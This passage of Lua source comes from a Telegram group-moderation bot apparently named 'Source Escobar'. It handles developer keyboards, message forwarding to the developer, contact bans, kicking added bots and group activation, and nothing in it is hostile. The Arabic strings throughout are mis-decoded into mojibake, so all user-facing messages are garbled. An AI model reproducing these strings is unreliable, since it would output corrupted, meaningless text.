{'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ','ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ'},
{'ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³','Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ'},
{'β Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω β','β Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§Ω β','β Ψ§ΨΆΩ Ψ±Ψ― ΨΉΨ§Ω β'},
{'β Ψ­Ψ°Ω Ψ±Ψ― Ψ§ΩΨ?Ψ§Ψ΅ β','β ΨͺΨΉΩΩΩ Ψ±Ψ― Ψ§ΩΨ?Ψ§Ψ΅ β'},
{'Ψ­Ψ°Ω ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω','ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω','ΨͺΨΉΩΩΩ ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω'},
{'Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω','ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω','ΨͺΨΊΩΨ± ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ ΨͺΨΉΩΩΩ ΩΩΨ§ΩΨ΄ Ψ§ΩΨ§ΩΨ§ΩΨ± ~' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'β β« Ψ’ΩΩΩΩΩΨ’ Ψ¨Ω ΩΨ¬Ψ―Ψ―Ψ§ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ Ψ§ΩΩΨ·ΩΨ± \nβ β« Ψ§ΩΩΩ Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ± Ψ§ΩΨ?Ψ§Ψ΅Ω Ψ¨ΨͺΨΉΨ―ΩΩ ΩΨͺΨΊΩΩΨ± ΩΩΨ§ΩΨ΄ Ψ³ΩΨ±Ψ³ Ψ§Ψ³ΩΩΨ¨Ψ§Ψ± ΩΩΨ· Ψ§ΨΆΨΊΨ· ΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― ΨͺΩΩΩΩΩ°Ψ°Ω'
local key = {
{'Ψ­Ψ°Ω ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω','ΨͺΨΉΩΩΩ ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω'},
{'ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ψ§ΩΨ§ΩΨ§ΩΨ±'},
{'ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω3','ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω2','ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω1'},
{'ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω6','ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω5','ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω4'},
{'Ψ§Ψ³ΨͺΨΉΨ§Ψ―Ψ© ΩΩΨ§ΩΨ΄ Ψ§ΩΨ§ΩΨ§ΩΨ±'},
{'Ψ±Ψ¬ΩΨΉ Ψπβ'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' and ChCheck(msg) then  
if not Devmfm:get(mustafa..'mfm:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {{{text="β Ψ§ΩΩΨ·ΩΨ± .",url="t.me/"..(dp.username_ or "TEAM_Escobar")}}}
local start = Devmfm:get(mustafa.."mfm:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "β β« ΩΨ±Ψ­Ψ¨Ψ§ Ψ§ΩΨ§ Ψ¨ΩΨͺ Ψ§Ψ³ΩΩ "..NameBot.."\nβ β« Ψ§Ψ?ΨͺΨ΅Ψ§Ψ΅Ω Ψ­ΩΨ§ΩΨ© Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ\nβ β« ΩΩ Ψ§ΩΨͺΩΩΩΨ΄ ΩΨ§ΩΨ³Ψ¨Ψ§Ω ΩΨ§ΩΨ?Ψ? .. . Ψ\nβ β« ΨͺΩΨΉΩΩΩ Ψ³ΩΩ ΩΩΨ¬Ψ§ΩΨ§ ΩΩΨ· ΩΩ Ψ¨Ψ±ΩΨΉΩ Ψ§Ψ―ΩΩ ΩΩΩΩ° ΩΨ¬ΩΩΨΉΨͺΩ ΩΨ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ± β ΨͺΩΨΉΩΩ\nβ β« Ψ³ΩΨͺΩ Ψ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ ΩΨ§ΩΩΩΨ΄Ψ¦ ΨͺΩΩΨ§Ψ¦ΩΨ§"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
Devmfm:setex(mustafa..'mfm:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source Escobar     --
if not SecondSudo(msg) and not Devmfm:sismember(mustafa..'mfm:Ban:Pv',msg.sender_user_id_) and not Devmfm:get(mustafa..'mfm:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_mfm(msg.sender_user_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ±Ψ³Ψ§ΩΨͺΩ Ψ§ΩΩ [Ψ§ΩΩΨ·ΩΨ±](t.me/'..(chat.username_ or "TEAM_Escobar")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'β β« ΨͺΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΩΨ΅Ω ΩΩ β β₯‘\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'Ψ­ΨΈΨ±' or text == 'Ψ­ΨΆΨ±' then
local Text = 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nβ β« ΨͺΩΩΩΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
Devmfm:sadd(mustafa..'mfm:Ban:Pv',data.id_)  
return false  
end 
if text == 'Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ±' or text == 'Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±' then
local Text = 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nβ β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
Devmfm:srem(mustafa..'mfm:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ ΩΨ§Ω Ψ¨Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΩΨ§ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω ΩΩ', 1, 'md')
return false  
end 
if text then
Dev_mfm(id_user, 0, 1, text, 1, "md")  
Text = 'β β« ΨͺΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ±Ψ³Ψ§ΩΩ οΏ½οΏ½οΏ½οΏ½οΏ½οΏ½ΩΩ β β₯‘'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = 'β β« ΨͺΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΩΨ΅Ω Ψ§ΩΩ β β₯‘'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = 'β β« ΨͺΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΩ β β₯‘'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = 'β β« ΨͺΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ§ΩΩ β β₯‘'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = 'β β« ΨͺΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ¨Ψ΅ΩΩ Ψ§ΩΩ β β₯‘'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source Escobar     --
if text and Devmfm:get(mustafa..'mfm:Start:Bots'..msg.sender_user_id_) then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΨ³ΨͺΨ§Ψ±Ψͺ', 1, 'md')
Devmfm:del(mustafa..'mfm:Start:Bots'..msg.sender_user_id_) 
return false
end
Devmfm:set(mustafa.."mfm:Start:Bot",text)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΨ³ΨͺΨ§Ψ±Ψͺ', 1, 'md')
Devmfm:del(mustafa..'mfm:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'ΨͺΨΉΩΩΩ Ψ±Ψ― Ψ§ΩΨ?Ψ§Ψ΅' or text == 'ΨΆΨΉ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ' or text == 'β ΨͺΨΉΩΩΩ Ψ±Ψ― Ψ§ΩΨ?Ψ§Ψ΅ β' then 
Devmfm:set(mustafa..'mfm:Start:Bots'..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ ΩΩΩΨ΄Ψ© Ψ§ΩΨ³ΨͺΨ§Ψ±Ψͺ Ψ§ΩΨ§Ω', 1, 'md')
return false
end
if text == 'Ψ­Ψ°Ω Ψ±Ψ― Ψ§ΩΨ?Ψ§Ψ΅' or text == 'Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ' or text == 'β Ψ­Ψ°Ω Ψ±Ψ― Ψ§ΩΨ?Ψ§Ψ΅ β' then 
Devmfm:del(mustafa..'Start:Bot') 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ψ© Ψ§ΩΨ³ΨͺΨ§Ψ±Ψͺ Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
end
if text == 'Ψ¬ΩΨ¨ Ψ±Ψ― Ψ§ΩΨ?Ψ§Ψ΅' then  
local start = Devmfm:get(mustafa.."mfm:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "β β« ΩΨ±Ψ­Ψ¨Ψ§ Ψ§ΩΨ§ Ψ¨ΩΨͺ Ψ§Ψ³ΩΩ "..NameBot.."\nβ β« Ψ§Ψ?ΨͺΨ΅Ψ§Ψ΅Ω Ψ­ΩΨ§ΩΨ© Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ\nβ β« ΩΩ Ψ§ΩΨͺΩΩΩΨ΄ ΩΨ§ΩΨ³Ψ¨Ψ§Ω ΩΨ§ΩΨ?Ψ? .. . Ψ\nβ β« ΨͺΩΨΉΩΩΩ Ψ³ΩΩ ΩΩΨ¬Ψ§ΩΨ§ ΩΩΨ· ΩΩ Ψ¨Ψ±ΩΨΉΩ Ψ§Ψ―ΩΩ ΩΩΩΩ° ΩΨ¬ΩΩΨΉΨͺΩ ΩΨ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ± β ΨͺΩΨΉΩΩ\nβ β« Ψ³ΩΨͺΩ Ψ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ ΩΨ§ΩΩΩΨ΄Ψ¦ ΨͺΩΩΨ§Ψ¦ΩΨ§"
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω' or text == 'β ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω β' then   
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Texting:Pv') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω' or text == 'β ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω β' then  
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Texting:Pv',true) 
end
end
--     Source Escobar     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
Devmfm:incr(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:set(mustafa.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = Devmfm:get(mustafa.."mfm:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(mustafa) then 
Devmfm:srem(mustafa.."mfm:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) then
SendText(DevId,"β β« ΨͺΩΩΩΩ Ψ·Ψ±Ψ― Ψ§ΩΨ¨ΩΨͺ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘ \nββββ EB ββββ\nβ β« Ψ¨ΩΨ§Ψ³Ψ·Ψ© β "..Name.."\nβ β« Ψ§Ψ³Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β ["..NameChat.."]\nβ β« Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘ \nβ¨ `"..msg.chat_id_.."` β©\nββββ EB ββββ\nβ β« Ψ§ΩΩΩΨͺ β "..os.date("%I:%M%p").."\nβ β« Ψ§ΩΨͺΨ§Ψ±ΩΨ? β "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
Devmfm:incr(mustafa..'mfm:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
Devmfm:incr(mustafa..'mfm:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source Escobar     --
if text ==('ΨͺΩΨΉΩΩ') and not SudoBot(msg) and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:FreeBot'..mustafa) then
if ChatType == 'pv' then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΨΉΩΩΩ ΩΩΩΨ’ ΩΨ±Ψ¬Ω Ψ§ΨΆΨ§ΩΨͺΩ ΩΩΩΩ° ΩΨ¬ΩΩΨΉΩ Ψ§ΩΩΨ§', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΨΉΨ§Ψ―ΩΩ ΩΩΩΨ³Ψͺ Ψ?Ψ§Ψ±ΩΩ ΩΨ§ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΨΉΩΩΩ ΩΨ±Ψ¬Ω Ψ§Ω ΨͺΨΆΨΉ Ψ³Ψ¬Ω Ψ±Ψ³Ψ§Ψ¦Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΨΆΨ§ΩΨ± ΩΩΩΨ³ ΩΨ?ΩΩΩΩ° ΩΩΩ Ψ¨ΨΉΨ―ΩΨ§ ΩΩΩΩΩ Ψ±ΩΨΉΩ Ψ§Ψ―ΩΩ Ψ«Ω ΨͺΩΨΉΩΩΩ', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'ΩΩΨ΄Ψ¦'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'Ψ§Ψ―ΩΩ'
else 
status = 'ΨΉΨΆΩΩΩΩ'
end
Devmfm:del(mustafa..'mfm:mfmConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
Devmfm:sadd(mustafa.."mfm:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Devmfm:sadd(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Devmfm:srem(mustafa.."mfm:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Devmfm:srem(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if Devmfm:sismember(mustafa..'mfm:Groups',msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΩΩΨΉΩΩ', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(Devmfm:get(mustafa..'mfm:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ§ΩΩ ΩΩ β *'..(Devmfm:get(mustafa..'mfm:Num:Add:Bot') or 0)..'* ΨΉΨΆΩΩΩΩ', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© "..dp.title_)  
